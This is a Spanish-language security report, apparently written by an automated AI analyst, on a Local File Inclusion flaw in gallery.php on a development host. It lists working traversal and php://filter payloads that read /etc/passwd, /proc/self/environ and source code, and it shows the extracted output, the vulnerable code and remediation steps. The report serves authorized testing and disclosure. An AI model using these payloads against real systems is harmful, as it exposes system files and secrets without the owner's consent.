# Informe de análisis LFI — Galería de Arte Virtual

Fecha: 2026-04-18T19:26:20Z
Objetivo: http://web.dev.local:8081
Analista: GPT-5 mini (automated)

Resumen ejecutivo
-----------------
Se detectó y explotó una vulnerabilidad Local File Inclusion (LFI) en gallery.php. Fue posible leer archivos arbitrarios del sistema y obtener el código fuente del script.

Pruebas realizadas y payloads
----------------------------
- Acceso normal: gallery.php?page=modern
- Lectura de /etc/passwd: gallery.php?page=../../../../../../etc/passwd
- Lectura de /proc/self/environ: gallery.php?page=../../../../../../proc/self/environ
- Extracción del código fuente via filter: gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php
- Extracción de /etc/passwd en base64: gallery.php?page=php://filter/convert.base64-encode/resource=/etc/passwd

Evidencia (resumen)
-------------------
- /etc/passwd (fragmento obtenido):
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

- /proc/self/environ: inclusion mostró warnings por permisos, pero confirmó posibilidad de incluir rutas del sistema.

- Código fuente de gallery.php (extraído con php://filter): el script contiene:
  $page = $_GET['page'] ?? 'modern';
  if (strpos($page, '.') !== false) { $file = $page; } else { $file = "pages/" . $page . ".php"; }
  if (file_exists($file)) { include($file); } else { ... @include($file); }
  (Incluye $file directamente sin validación ni whitelist.)

Impacto
-------
- Lectura de ficheros sensibles (confidencialidad).
- Posible divulgación de código fuente y credenciales si existen en archivos legibles.
- Potencial escalada a RCE si se encuentra archivo escribible o uso de wrappers para ejecutar código.

Recomendaciones
---------------
1. Implementar whitelist de páginas permitidas (mapear nombres a archivos fijos).
2. Evitar incluir rutas construidas a partir de input del usuario. Si es necesario, usar basename/realpath y verificar que el fichero esté dentro del directorio permitido.
3. Deshabilitar wrappers peligrosos (si procede) y limitar allow_url_include.
4. Restringir permisos de ficheros sensibles y desactivar la visualización de errores en producción.
5. Auditar código para evitar @include silencioso y validar entradas.

Acciones realizadas
------------------
- Se ejecutaron requests GET desde entorno autorizado del analista para verificar LFI.
- No se realizaron modificaciones en el objetivo; solo lectura de ficheros existentes.

Conclusión
----------
Vulnerabilidad LFI confirmada y explotada con éxito para lectura de ficheros locales y extracción de código fuente. Se requiere corrección urgente según recomendaciones.

